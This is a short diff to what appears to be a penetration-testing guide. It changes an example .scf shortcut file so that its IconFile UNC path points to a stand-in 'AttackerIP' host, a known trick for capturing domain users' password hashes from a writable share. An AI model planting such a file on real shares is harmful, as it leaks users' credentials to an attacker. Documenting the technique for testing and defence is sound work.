@@ -193,7 +193,7 @@ It is possible to obtain passwords hashes of domain users or shells when writing
 ```text
 [Shell]
 Command=2
-IconFile=\\X.X.X.X\share\ordinary.ico
+IconFile=\\AttackerIP\ordinary.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
